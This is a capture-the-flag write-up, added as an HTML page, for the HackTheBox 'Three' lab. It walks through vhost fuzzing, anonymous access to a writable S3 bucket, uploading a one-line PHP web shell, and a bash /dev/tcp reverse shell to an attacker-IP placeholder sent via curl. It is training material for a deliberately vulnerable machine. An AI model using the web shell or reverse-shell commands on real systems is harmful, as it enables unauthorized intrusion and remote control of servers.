@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB: Three — Public S3 Bucket to PHP Web Shell RCE</title>
+<style>
+  * { box-sizing: border-box; }
+  html { background-color: #0a0e27; }
+  body {
+    background-color: rgba(10, 14, 39, 0.9);
+    color: #e0e0e0;
+    font-family: 'Courier New', monospace;
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 40px 20px;
+    line-height: 1.6;
+  }
+  /* Animated grid background */
+  .bg-animation {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: -1;
+    opacity: 0.08;
+    background:
+      linear-gradient(90deg, transparent 98%, #00ff88 100%),
+      linear-gradient(0deg, transparent 98%, #00ff88 100%);
+    background-size: 50px 50px;
+    animation: grid-flow 20s linear infinite;
+  }
+  @keyframes grid-flow {
+    0% { transform: translateY(0); }
+    100% { transform: translateY(50px); }
+  }
+  a { color: #66d9ef; text-decoration: none; }
+  a:hover { color: #00ff88; text-decoration: underline; }
+  h1 {
+    color: #00ff88;
+    text-shadow: 0 0 8px rgba(0,255,136,0.5);
+    font-size: 2.2em;
+    margin-bottom: 10px;
+  }
+  .subtitle { color: #66d9ef; font-size: 1em; margin-bottom: 20px; }
+  h2 {
+    color: #00ff88;
+    border-bottom: 1px solid #1a1f3a;
+    padding-bottom: 8px;
+    margin-top: 50px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+  h3 { color: #66d9ef; margin-top: 30px; }
+  .tags { margin: 15px 0 5px 0; }
+  .tag {
+    display: inline-block;
+    background: rgba(0,255,136,0.1);
+    border: 1px solid rgba(0,255,136,0.3);
+    color: #00ff88;
+    padding: 4px 12px;
+    margin-right: 8px;
+    font-size: 0.85em;
+    border-radius: 4px;
+  }
+  .tag.veasy {
+    background: rgba(199,36,255,0.2);
+    color: #c724ff;
+    border-color: #c724ff;
+  }
+  .meta { color: #888; font-size: 0.9em; margin-bottom: 30px; }
+  .meta b { color: #a0a0a0; }
+  code, pre {
+    background-color: #10152e;
+    border: 1px solid #232a4d;
+    border-radius: 4px;
+  }
+  code { padding: 2px 6px; font-size: 0.95em; color: #66d9ef; }
+  pre {
+    padding: 16px;
+    overflow-x: auto;
+    margin: 16px 0;
+    color: #b8e6c8;
+    border-left: 3px solid #00ff88;
+  }
+  pre code { border: none; padding: 0; color: inherit; background: none; }
+  .callout {
+    background: rgba(102,217,239,0.06);
+    border-left: 3px solid #66d9ef;
+    padding: 12px 18px;
+    margin: 20px 0;
+    color: #b0c4cc;
+  }
+  .callout.warn {
+    background: rgba(255,208,0,0.06);
+    border-left: 3px solid #ffd000;
+    color: #d8cfa0;
+  }
+  .callout strong { color: #66d9ef; }
+  .callout.warn strong { color: #ffd000; }
+  .divider {
+    border: none;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, #00ff88, transparent);
+    margin: 40px 0;
+  }
+  ul, ol { padding-left: 22px; }
+  li { margin-bottom: 8px; }
+  .back { display: inline-block; margin-bottom: 30px; color: #66d9ef; }
+  strong { color: #fff; }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 16px 0;
+  }
+  th, td {
+    border: 1px solid #232a4d;
+    padding: 8px 12px;
+    text-align: left;
+  }
+  th {
+    color: #00ff88;
+    background: rgba(0,255,136,0.05);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+  /* Screenshot figures */
+  figure {
+    margin: 24px 0;
+    border: 1px solid #232a4d;
+    border-radius: 6px;
+    overflow: hidden;
+    background: #000;
+  }
+  figure img { display: block; width: 100%; height: auto; }
+  figcaption {
+    padding: 10px 14px;
+    font-size: 0.82em;
+    color: #888;
+    background: #10152e;
+    border-top: 1px solid #232a4d;
+  }
+  /* Attack-chain block */
+  .chain {
+    background: #10152e;
+    border: 1px solid #232a4d;
+    border-left: 3px solid #00ff88;
+    border-radius: 4px;
+    padding: 20px 24px;
+    font-size: 0.9em;
+    color: #00ff88;
+    white-space: pre-wrap;
+    line-height: 1.9;
+    overflow-x: auto;
+  }
+  .chain .arrow { color: #66d9ef; }
+  /* Skills-assessment Q&A */
+  .qa {
+    background: #10152e;
+    border: 1px solid #232a4d;
+    border-radius: 6px;
+    padding: 14px 18px;
+    margin: 14px 0;
+  }
+  .qa .q { color: #66d9ef; font-weight: 600; margin-bottom: 6px; }
+  .qa .a { color: #00ff88; }
+</style>
+</head>
+<body>
+
+<div class="bg-animation"></div>
+
+<a class="back" href="index.html#writeups">&larr; Back to all writeups</a>
+
+<h1>HTB: Three</h1>
+<div class="subtitle">Subdomain Fuzzing &rarr; Misconfigured AWS S3 Bucket &rarr; PHP Web Shell &rarr; RCE</div>
+
+<div class="tags">
+  <span class="tag">HACKTHEBOX</span>
+  <span class="tag veasy">VERY EASY</span>
+  <span class="tag">LINUX</span>
+  <span class="tag">AWS S3</span>
+  <span class="tag">MISCONFIGURATION</span>
+  <span class="tag">WEB SHELL</span>
+</div>
+
+<div class="meta">
+  Author: th3_m4d_h4ck3r &nbsp;|&nbsp; Framework: Scarif Operations &nbsp;|&nbsp; Season 11
+</div>
+
+<h2>&gt; SUMMARY</h2>
+<p>
+  A "very easy" HTB Starting Point machine hosting a band website ("The Toppers") for a fictional Linux
+  server. The site's content was found to be entirely backed by a publicly writable Amazon S3 bucket,
+  exposed through a hidden subdomain discovered via virtual-host fuzzing. With no authentication
+  required, the bucket's write permissions allowed direct upload of a PHP web shell, which &mdash;
+  because the bucket doubled as the live Apache web root &mdash; was immediately executable through the
+  main site. This gave remote code execution as <code>www-data</code>, escalating quickly to a full
+  reverse shell and the target flag.
+</p>
+
+<h2>&gt; RECON</h2>
+<p>Initial full-port service discovery via <code>db_nmap</code> inside msfconsole:</p>
+<pre><code>db_nmap -sC -sV -A -p- --min-rate 5000 &lt;target&gt;</code></pre>
+
+<table>
+  <tr><th>Port</th><th>Service</th><th>Version</th></tr>
+  <tr><td>22/tcp</td><td>ssh</td><td>OpenSSH 7.6p1 (Ubuntu Linux)</td></tr>
+  <tr><td>80/tcp</td><td>http</td><td>Apache httpd 2.4.29 (Ubuntu)</td></tr>
+</table>
+
+<figure>
+  <img src="images/three-01-nmap-recon.png" alt="Nmap scan showing SSH and Apache open, page title The Toppers">
+  <figcaption>db_nmap output inside msfconsole &mdash; SSH and Apache/PHP confirmed, page title "The Toppers"</figcaption>
+</figure>
+
+<p>
+  Only two ports open: SSH and a web server with the page title <strong>"The Toppers"</strong> &mdash; a
+  band-themed corporate site. No obvious vulnerabilities on the surface; the interesting content was
+  hidden behind virtual-host routing.
+</p>
+
+<h2>&gt; ENUMERATION — FINDING THE HIDDEN SUBDOMAIN</h2>
+<p>
+  The site redirected to a bound hostname (<code>thetoppers.htb</code>), which was added to
+  <code>/etc/hosts</code>. From there, virtual-host fuzzing was used to look for hidden subdomains not
+  linked anywhere on the visible site:
+</p>
+<pre><code>ffuf -u http://&lt;target&gt; -H "Host: FUZZ.thetoppers.htb" \
+     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+     -fs &lt;baseline_response_size&gt;</code></pre>
+
+<p>This surfaced a distinct subdomain returning a completely different (and much smaller) response than the default site:</p>
+<pre><code>s3.thetoppers.htb  →  {"status": "running"}</code></pre>
+
+<div class="callout">
+  <strong>Key signal:</strong> The tiny JSON response combined with the <code>s3.</code> naming
+  convention was an immediate tell &mdash; this endpoint wasn't part of the website's own application
+  logic, it was a cloud storage service's status endpoint being exposed directly.
+</div>
+
+<h2>&gt; EXPLOITATION — ACCESSING THE S3 BUCKET</h2>
+<p>With the subdomain added to <code>/etc/hosts</code>, the AWS CLI was configured with dummy (unauthenticated) credentials, since the bucket was expected to be publicly misconfigured:</p>
+<pre><code>aws configure
+AWS Access Key ID: test
+AWS Secret Access Key: test
+Default region name: us-east-1
+Default output format: json</code></pre>
+
+<p>Listing available buckets against the custom endpoint confirmed anonymous access was permitted:</p>
+<pre><code>aws --endpoint=http://s3.thetoppers.htb s3 ls</code></pre>
+<pre><code>2026-08-22 12:59:11  thetoppers.htb</code></pre>
+
+<p>Listing the bucket's contents revealed it was directly backing the live website:</p>
+<pre><code>aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb</code></pre>
+<pre><code>                           PRE images/
+2026-08-22 12:59:11          0 .htaccess
+2026-08-22 12:59:11      11952 index.php</code></pre>
+
+<div class="callout warn">
+  <strong>Confirmation point:</strong> The <code>index.php</code> file size (11952 bytes) matched
+  exactly the byte count of the live site's homepage &mdash; proving the S3 bucket <em>was</em> the web
+  root, not just a related storage location.
+</div>
+
+<h3>Confirming Write Access</h3>
+<p>A harmless test file was uploaded directly to the bucket and then requested through the live site to confirm read/write round-trip access:</p>
+<pre><code>echo "test" > test.txt
+aws --endpoint=http://s3.thetoppers.htb s3 cp test.txt s3://thetoppers.htb/test.txt
+curl http://thetoppers.htb/test.txt</code></pre>
+<pre><code>test</code></pre>
+
+<p>Full public write access confirmed, with content immediately served back through Apache on the main domain.</p>
+
+<h3>Uploading a PHP Web Shell</h3>
+<p>Since the bucket serves directly as the PHP-enabled web root, a minimal command-execution shell was staged and uploaded the same way:</p>
+<pre><code>echo '&lt;?php system($_GET["cmd"]); ?&gt;' > shell.php
+aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/shell.php</code></pre>
+
+<p>Triggered directly through the live site to confirm code execution:</p>
+<pre><code>curl "http://thetoppers.htb/shell.php?cmd=id"</code></pre>
+<pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+
+<figure>
+  <img src="images/three-02-s3-exploitation.png" alt="AWS CLI configuration, bucket listing, write access test, and shell.php RCE confirmation">
+  <figcaption>AWS CLI setup, bucket enumeration, write-access confirmation, and initial RCE via shell.php</figcaption>
+</figure>
+
+<h2>&gt; POST-EXPLOITATION — REVERSE SHELL</h2>
+<p>With confirmed command execution, a proper interactive reverse shell was triggered through the same PHP endpoint. A local listener was started first:</p>
+<pre><code>nc -lvnp 4444</code></pre>
+
+<p>The payload initially failed due to curl choking on unencoded special characters in the raw URL:</p>
+<pre><code>curl "http://thetoppers.htb/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/&lt;attacker_ip&gt;/4444 0>&1'"
+curl: (3) URL rejected: Malformed input to a URL function</code></pre>
+
+<p>Resolved by letting curl handle URL-encoding automatically via <code>-G</code> and <code>--data-urlencode</code>:</p>
+<pre><code>curl -G "http://thetoppers.htb/shell.php" \
+     --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/&lt;attacker_ip&gt;/4444 0>&1'"</code></pre>
+
+<div class="callout">
+  <strong>Lesson:</strong> Raw shell payloads containing spaces, ampersands, and redirection operators
+  will break naive <code>curl "url?param=value"</code> syntax. <code>-G</code> with
+  <code>--data-urlencode</code> is the reliable pattern for passing shell one-liners as GET parameters
+  without hand-encoding every special character.
+</div>
+
+<p>The listener caught the callback and dropped into an interactive shell:</p>
+<pre><code>www-data@three:/var/www/html$ ls
+images
+index.php
+shell.php
+test.txt
+www-data@three:/var/www/html$ cd ../
+www-data@three:/var/www$ ls
+flag.txt
+html
+www-data@three:/var/www$ cat flag.txt
+[flag redacted]</code></pre>
+
+<figure>
+  <img src="images/three-03-reverse-shell-flag.png" alt="Netcat listener catching the reverse shell and reading flag.txt">
+  <figcaption>Reverse shell landing as www-data, navigating up from the web root, and reading flag.txt (flag redacted)</figcaption>
+</figure>
+
+<p><strong>Flag:</strong> <code>[flag redacted]</code></p>
+
+<h2>&gt; ATTACK CHAIN SUMMARY</h2>
+<div class="chain">nmap recon (22/tcp SSH, 80/tcp Apache — "The Toppers")
+        <span class="arrow">│</span>
+        <span class="arrow">▼</span>
+vhost discovery (thetoppers.htb via redirect)
+        <span class="arrow">│</span>
+        <span class="arrow">▼</span>
+ffuf vhost fuzzing → hidden subdomain: s3.thetoppers.htb
+        <span class="arrow">│</span>
+        <span class="arrow">▼</span>
+AWS CLI (anonymous creds) → public S3 bucket confirmed
+        <span class="arrow">│</span>
+        <span class="arrow">▼</span>
+Bucket contents match live web root exactly (index.php, 11952 bytes)
+        <span class="arrow">│</span>
+        <span class="arrow">▼</span>
+Write access confirmed → PHP web shell uploaded (shell.php)
+        <span class="arrow">│</span>
+        <span class="arrow">▼</span>
+RCE confirmed as www-data via shell.php?cmd=
+        <span class="arrow">│</span>
+        <span class="arrow">▼</span>
+Reverse shell via curl -G --data-urlencode + netcat listener
+        <span class="arrow">│</span>
+        <span class="arrow">▼</span>
+Flag retrieved from /var/www/flag.txt</div>
+
+<h2>&gt; KEY TAKEAWAYS</h2>
+<ol>
+  <li><strong>Cloud storage backends can hide behind unassuming subdomains.</strong> An <code>s3.</code>-prefixed vhost returning a minimal JSON status response is a strong signal of a self-hosted or misconfigured object storage service &mdash; worth probing with cloud-specific tooling immediately.</li>
+  <li><strong>Matching file sizes between a discovered bucket and the live site is a fast, reliable way to confirm a bucket is the actual web root</strong> rather than just a related asset store &mdash; no need to guess at impact once byte counts align.</li>
+  <li><strong>Anonymous/dummy AWS credentials are sufficient to interact with publicly misconfigured S3-compatible endpoints.</strong> Always attempt <code>aws configure</code> with placeholder values before assuming credentials are a blocker.</li>
+  <li><strong>Write access to a bucket that also serves as a PHP-enabled web root is immediate RCE</strong> &mdash; no additional exploit chaining required once upload and code execution are both confirmed.</li>
+  <li><strong>Reverse shell payloads with special characters need proper URL encoding.</strong> <code>curl -G --data-urlencode</code> is the clean, repeatable pattern over manually escaping ampersands and redirects in a raw query string.</li>
+</ol>
+
+<h2>&gt; SKILLS ASSESSMENT Q&amp;A</h2>
+
+<div class="qa">
+  <div class="q">In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses?</div>
+  <div class="a">/etc/hosts</div>
+</div>
+
+<div class="qa">
+  <div class="q">Which service is running on the discovered sub-domain?</div>
+  <div class="a">Amazon S3 (S3-compatible object storage)</div>
+</div>
+
+<div class="qa">
+  <div class="q">Which command line utility can be used to interact with the service running on the discovered sub-domain?</div>
+  <div class="a">AWS CLI</div>
+</div>
+
+<div class="qa">
+  <div class="q">Which command is used to set up the AWS CLI installation?</div>
+  <div class="a">sudo apt install awscli</div>
+</div>
+
+<div class="qa">
+  <div class="q">What is the command used by the above utility to list all of the S3 buckets?</div>
+  <div class="a">aws s3 ls</div>
+</div>
+
+<div class="qa">
+  <div class="q">This server is configured to run files written in what web scripting language?</div>
+  <div class="a">PHP</div>
+</div>
+
+<hr class="divider">
+
+<p style="color:#6a7a85; font-size:0.85em;">
+Scarif Operations &nbsp;|&nbsp; th3m4dh4ck3r.com &nbsp;|&nbsp; CPTS prep, Season 11
+</p>
+
+    <!-- Matrix Rain Effect — full-page backdrop behind all content -->
+    <canvas id="matrix-rain"></canvas>
+    <script>
+        // Full-width Matrix rain rendered as a fixed backdrop across the whole
+        // page. z-index:-1 + pointer-events:none keep it strictly BEHIND the
+        // content so it never runs over text, tags, code blocks or images.
+        (function () {
+            const canvas = document.getElementById('matrix-rain');
+            const ctx = canvas.getContext('2d');
+
+            canvas.style.position = 'fixed';
+            canvas.style.top = '0';
+            canvas.style.left = '0';
+            canvas.style.zIndex = '-1';
+            canvas.style.pointerEvents = 'none';
+            canvas.style.opacity = '0.4';
+
+            const matrixChars = 'ｱｲｳｴｵｶｷｸｹｺｻｼｽｾｿﾀﾁﾂﾃﾄﾅﾆﾇﾈﾉﾊﾋﾌﾍﾎﾏﾐﾑﾒﾓﾔﾕﾖﾗﾘﾙﾚﾛﾜﾝ01234567890@#$%^&*()';
+            const fontSize = 16;
+            let drops = [];
+
+            function initColumns() {
+                const columns = Math.floor(canvas.width / fontSize);
+                drops = [];
+                for (let i = 0; i < columns; i++) {
+                    drops[i] = Math.random() * -100;
+                }
+            }
+
+            function resize() {
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+                initColumns();
+            }
+
+            function draw() {
+                ctx.fillStyle = 'rgba(10, 14, 39, 0.05)';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+                ctx.fillStyle = '#00ff88';
+                ctx.font = fontSize + 'px monospace';
+
+                for (let i = 0; i < drops.length; i++) {
+                    const char = matrixChars[Math.floor(Math.random() * matrixChars.length)];
+                    ctx.fillText(char, i * fontSize, drops[i] * fontSize);
+                    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                        drops[i] = 0;
+                    }
+                    drops[i]++;
+                }
+            }
+
+            resize();
+            setInterval(draw, 50);
+            window.addEventListener('resize', resize);
+        })();
+    </script>
+
+</body>
+</html>
